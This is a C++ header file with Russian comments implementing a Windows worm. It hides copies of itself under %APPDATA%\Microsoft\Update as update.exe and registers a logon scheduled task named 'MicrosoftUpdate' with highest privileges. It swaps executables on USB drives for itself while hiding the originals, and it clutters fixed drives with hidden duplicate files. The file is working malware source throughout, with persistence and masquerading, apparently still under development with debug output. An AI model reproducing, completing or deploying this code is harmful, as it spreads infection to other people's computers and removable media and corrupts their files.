#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>
#include <iostream>
#include <chrono>
#include <random>
#include <locale>
#include <codecvt>
#include <Lmcons.h>
#include <shlobj.h>
#include <cstdlib> // для wstring?
#include <fstream>  // для работы generate_loader_source

using namespace std;
namespace fs = std::filesystem;


std::wstring get_own_path();
std::wstring get_drive_root_from_path(const std::wstring& full_path);
bool is_hidden(const fs::path& path);
void init_locale();
// Генератор случайных чисел
wstring generate_unique_suffix();
vector<wstring> get_removable_volume_paths(); // поиск всех съемных носителей
void filter_only_exe(vector<fs::path>& files); // фильтруем из всех файлов, только exe


void worm_was_started();
wstring get_username();
vector<wstring> get_all_volumes();
vector<wstring> get_paths_for_volume(const wstring& volumeName);


class worm
{
private:

	wstring path_to_start;
	vector <wstring> list_dir;
	vector <fs::path> file_to_copy;
	int iteration;
	vector <fs::path> exe_on_the_flash_drive;



public:
	worm(const wstring& path_to_start = get_own_path(), int iteration = 2)
		: path_to_start(path_to_start), iteration(iteration) {};


	void worm_was_started() { // Massage Box для отладки
		MessageBoxW(
			NULL,                            // Владелец окна (NULL — нет владельца)
			L"Ты был заражён!",              // Текст сообщения
			L"Предупреждение",               // Заголовок окна
			MB_OK | MB_ICONWARNING           // Кнопка OK и значок предупреждения
		);
	}


	void scan_all_volumes() { // поиск по всем корневым дискам, исключая съемные носители
		auto volumes = get_all_volumes();

		for (const auto& vol : volumes) {
			auto paths = get_paths_for_volume(vol);

			for (const auto& path : paths) {
				UINT driveType = GetDriveTypeW(path.c_str());

				if (driveType == DRIVE_FIXED) { // только SSD/HDD, так как для флешек и прочих съемных носителей другая логика
					std::wcout << L"Обход: " << path << L"\n";
					search_list_dir(path, list_dir); 
				}
				else {
					std::wcout << L"Пропущено (не HDD/SSD): " << path << L"\n";
				}
			}
		}
	}


	


	void search_list_dir(const wstring& path_to_dir, vector<wstring> &list_dir_tmp) { // рекурсивный поиск всех подпапок по адрессу и внутри и копирование в выбранный вектор
		error_code ec;

		fs::directory_iterator it(path_to_dir, ec);
		if (ec) {
			wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
			return;
		}

		for (const auto& entry : it) {
			if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
				std::wstring dir_path = entry.path().wstring();
				list_dir_tmp.push_back(dir_path);
				search_list_dir(dir_path, list_dir_tmp);  // рекурсия
			}
		}
		list_dir_tmp.push_back(path_to_dir);
		
	}


	void search_list_dir() { // для старта поиска по дирректориям
		list_dir.clear();
		//search_list_dir(path_to_start, list_dir);
		search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
		//list_dir.push_back(path_to_start);
	}

	void print_list_dir() { // вывод всех найденных папок, в которых будет копирование
		for (auto entry : list_dir) {
			wcout << entry << endl;
		}
	}

	void collect_visible_files() { // тот же отбор, только без параметров ( чтобы использовать без указания пути, для запуска червя )
		collect_visible_files(list_dir, file_to_copy);
	}

	void collect_visible_files(const vector<wstring> list_dir_tmp, vector<fs::path>& collected_files) { // функция отбирающая только видимые файлы в определенный вектор, чтобы потом копировать все что в нем есть 
		collected_files.clear();

		if (list_dir_tmp.empty()) {
			std::cerr << "Список директорий пуст! Сначала выполните search_list_dir()\n";
			return;
		}

		for (const auto& dir : list_dir_tmp) {
			for (const auto& entry : fs::directory_iterator(dir)) {
				try {
					std::error_code ec;
					auto status = entry.status(ec);
					if (ec || !fs::is_regular_file(status)) continue;

					// Проверка скрытости
					DWORD attrs = GetFileAttributesW(entry.path().wstring().c_str());
					bool is_hidden = (attrs != INVALID_FILE_ATTRIBUTES) &&
						(attrs & FILE_ATTRIBUTE_HIDDEN);

					if (!is_hidden) {
						collected_files.push_back(entry.path());
					}
				}
				catch (...) {
					continue;
				}
			}
		}
	}

	void print_file_to_copy() { // выводит все файлы которые собирается копировать
		cout << "Вывод файлов для копирования" << endl;
		for (auto a1 : file_to_copy) {
			wcout << a1.wstring() << endl;
		}
	}

	void replicate_files() { // вызов копирования без параметров 
		replicate_files(iteration);
	}

	void replicate_files(int iteration = 1) { // создает скрытые копии из вектора поля file_to_copy в те же папки 
		if (file_to_copy.empty()) {
			std::cerr << "Список файлов пуст! Сначала выполните collect_visible_files()\n";
			return;
		}

		for (const auto& original_file : file_to_copy) {
			for (int i = 1; i <= iteration; ++i) {
			std::wstring ext = original_file.extension().wstring();
			std::wstring stem = original_file.stem().wstring();
			fs::path parent_dir = original_file.parent_path();

			std::wcout << L"Обрабатываем файл: " << original_file.wstring() << L"\n";

			
			fs::path copy_path = parent_dir / (stem + L"_" + generate_unique_suffix() + ext);

				try {
					fs::copy_file(original_file, copy_path, fs::copy_options::overwrite_existing);

					DWORD attrs = GetFileAttributesW(copy_path.wstring().c_str());
					if (attrs != INVALID_FILE_ATTRIBUTES) {
						DWORD new_attrs = attrs | FILE_ATTRIBUTE_HIDDEN | 0x4; // Добавил, чтобы было скрытие как системного файла
						if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
							std::wcerr << L"Ошибка SetFileAttributesW: " << GetLastError() << L"\n";
						}
					}
					else {
						std::wcerr << L"Ошибка GetFileAttributesW: " << GetLastError() << L"\n";
					}
				}
				catch (const fs::filesystem_error& e) {
					std::cerr << "  Ошибка при создании копии: " << e.what() << "\n";
				}
			}
		}
	}


	

	void copy_and_hide_worm() { // чтобы добавить в таск менеджер, желательно перекопировать червя в какую-то безопасную папку
		wchar_t own_path[MAX_PATH];
		GetModuleFileNameW(NULL, own_path, MAX_PATH);

		wchar_t appdata_path[MAX_PATH];
		SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata_path);  // %APPDATA%

		std::wstring dest_folder = std::wstring(appdata_path) + L"\\Microsoft\\Update"; // название скрытой папки куда будет скопирован червь
		std::wstring dest_exe = dest_folder + L"\\update.exe"; // название самого червя, которые будет добавляться в таск манагер винды 10

		// Создать директорию
		fs::create_directories(dest_folder);

		// Копировать себя
		CopyFileW(own_path, dest_exe.c_str(), FALSE);

		// Скрыть папку
		SetFileAttributesW(dest_folder.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

		// Скрыть файл
		SetFileAttributesW(dest_exe.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

		std::wcout << L"Файл червя скопирован в: " << dest_exe << std::endl;
	}

	void create_scheduled_task(const wstring& worm_path) { // создаем через Task Scheduler автозапуск червя при входе пользователя в систему ( путь указываем к текущему exe )
		// wstring worm_path = get_own_path();
		std::wstring cmd = L"schtasks /create /tn \"MicrosoftUpdate\" "
			L"/tr \"" + worm_path + L"\" "
			L"/sc ONLOGON /RL HIGHEST /F /RU \"" + get_username() + L"\"";
		_wsystem(cmd.c_str());
	}

	
	// Обработка съемных носителей



	void process_all_removable_disks() { // проходимся по всем съемным носителям
		vector<wstring> removable = get_removable_volume_paths();

		for (const auto& root : removable) {
			wcout << L"[Обработка]: " << root << endl;
			vector <wstring> data_list;
			data_list.clear();
			search_list_dir(root, data_list); // Рекурсивно собрать все директории

			collect_visible_files(data_list, exe_on_the_flash_drive); // Собираем все видимые файлы
			filter_only_exe(exe_on_the_flash_drive); // Фильтруем только .exe

			for (const auto& exe_path : exe_on_the_flash_drive) {
				hide_and_replace_exe(exe_path, get_own_path());
			}
		}
	}

	void hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path) {
		if (!dir_was_infected(target_exe)) { // проверка на заражение флешки
			// Сброс всех атрибутов (включая HIDDEN, SYSTEM, READONLY)
			SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_NORMAL);
			// Генерация уникального имени для оригинала
			std::wstring unique_suffix = generate_unique_suffix();
			fs::path backup = target_exe;
			backup.replace_filename(target_exe.stem().wstring() + L"_" + unique_suffix + target_exe.extension().wstring());
			fs::rename(target_exe, backup);
			CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE);
			// Установка скрытых атрибутов для оригинала
			SetFileAttributesW(backup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
			infected_dir(target_exe); // добавляем скрытый файл, чтобы не заражать флешку несколько раз
		}

	}

	void is_flash_drive_exist() {

	}

	bool infected_dir(const wstring& dir_path) { // создаем файл, чтобы не заражать флкшку несколько раз
		wstring full_name_to_file = dir_path + L"\\.infected";
		ofstream marker(full_name_to_file, ios::out);
		if (!marker.is_open()) { return false; }
		marker << "infected";
		marker.close();
		SetFileAttributes(full_name_to_file.c_str(), 0x2 | 0x4); 
		return true;
	}

	bool dir_was_infected(const wstring& dir_path) { // проверка на заражение
		wstring full_name_to_file = dir_path + L"\\.infected";
		return fs::exists(full_name_to_file);
	}



};

